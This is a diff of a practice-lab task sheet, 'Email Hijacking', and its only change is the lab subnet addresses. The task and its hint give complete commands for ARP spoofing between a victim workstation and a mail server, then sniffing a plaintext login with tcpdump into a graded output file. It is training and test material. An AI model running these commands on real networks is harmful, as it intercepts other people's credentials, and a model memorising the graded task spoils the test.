@@ -1,10 +1,10 @@
 Email Hijacking -- practice terminal
 ==========================================
 Targets:
-- webmail portal : http://victim-mail:8000 (172.27.0.2)
-- legacy mail-check service (PLAINTEXT, no encryption): 172.27.0.2:2323
-- victim workstation: 172.27.0.4 (polls its mailbox every ~25s)
-- you (attacker): 172.27.0.3
+- webmail portal : http://victim-mail:8000 (172.26.0.2)
+- legacy mail-check service (PLAINTEXT, no encryption): 172.26.0.2:2323
+- victim workstation: 172.26.0.4 (polls its mailbox every ~25s)
+- you (attacker): 172.26.0.3
 
 Background: the victim employee polls their mailbox over the legacy
 service. That protocol sends the mailbox password in clear text, but
@@ -12,8 +12,8 @@ switched networks do not deliver other hosts' traffic to you, so you
 must first position yourself in the middle (ARP spoofing), then sniff.
 
 Tasks:
-1. Become man-in-the-middle between victim (172.27.0.4) and
-   victim-mail (172.27.0.2): enable IP forwarding, run arpspoof in
+1. Become man-in-the-middle between victim (172.26.0.4) and
+   victim-mail (172.26.0.2): enable IP forwarding, run arpspoof in
    both directions (background them with &).
 2. Sniff the plaintext login and save the READABLE capture output to
    /tmp/output.txt (the grader looks for the password in that file).
@@ -25,6 +25,6 @@ Tasks:
 Tools available: arpspoof, tcpdump (use with sudo), telnet, curl,
 grep, iproute2, python3.
 Hint: start with: sudo sysctl -w net.ipv4.ip_forward=1
-  then: sudo arpspoof -i eth0 -t 172.27.0.4 172.27.0.2 &
-        sudo arpspoof -i eth0 -t 172.27.0.2 172.27.0.4 &
+  then: sudo arpspoof -i eth0 -t 172.26.0.4 172.26.0.2 &
+        sudo arpspoof -i eth0 -t 172.26.0.2 172.26.0.4 &
   then: sudo tcpdump -i eth0 -A -c 300 port 2323 > /tmp/output.txt
